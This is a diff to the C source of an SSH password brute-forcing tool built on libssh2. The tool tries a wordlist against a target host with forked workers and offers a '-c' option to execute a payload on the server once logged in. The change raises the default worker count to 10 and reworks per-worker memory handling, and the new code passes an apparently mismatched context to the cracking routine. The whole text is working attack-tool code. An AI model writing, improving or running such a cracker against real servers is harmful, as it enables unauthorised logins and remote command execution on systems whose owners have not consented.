@@ -55,7 +55,7 @@ void print_help(char *cmd) {
 	fprintf(stderr,"Usage: %s [OPTIONS]\n",cmd);
 	fprintf(stderr,"\t-c [payload]\tExecute payload on remote server once logged in\n");
 	fprintf(stderr,"\t-h\t\tDisplay this help\n");
-	fprintf(stderr,"\t-l [threads]\tLimit threads to given number. Default: 4\n");
+	fprintf(stderr,"\t-l [threads]\tLimit threads to given number. Default: 10\n");
 	fprintf(stderr,"\t-p [port]\tSpecify remote port\n");
 	fprintf(stderr,"\t-t [target]\tAttempt connections to this server\n");
 	fprintf(stderr,"\t-u [user]\tAttempt connection using this username\n");
@@ -267,7 +267,7 @@ void init_pw_tasker(int unix_fd, int threads) {
 
 int main(int argc, char *argv[]) {
     int rc, remote_port = 22, c_opt;
-    int threads = 4, unix_fd, i; 
+    int threads = 10, unix_fd, i; 
   
     char host[21] = "127.0.0.1", str_wordlist[256] = "wordlist.txt";
 	pid_t pid, task_pid;
@@ -352,16 +352,20 @@ int main(int argc, char *argv[]) {
 	printf("[*] Starting attack on %s@%s:%d\n",username,host,remote_port);
 	/* Loop through and spawn correct number of child threads */
 	for (i = 0; i < threads; ++i) {
-		add_thread_list(pid,host,remote_port);
+		struct t_ctx *ptr = (struct t_ctx*)malloc(sizeof(struct t_ctx));
+	
+		init_thread_ctx(host, remote_port, ptr);
 		pid = fork();
 		if (pid < 0) {
 			fprintf(stderr, "[!] Couldn't fork!\n");
 			destroy_pw_list();
 			exit(1);
 		} else if (pid == 0)  { 				/* child thread */
-			crack_thread(t_tail);
+			crack_thread(t_current);
 			
-			destroy_thread_list();
+			free(ptr);
+		} else {
+			free(ptr);
 		}
 	}
  
@@ -369,7 +373,6 @@ int main(int argc, char *argv[]) {
 	waitpid(task_pid, &status, 0);
  
  	/* proper cleanup */
-	destroy_thread_list();
 	destroy_pw_list();
 	libssh2_exit();
     return 0;
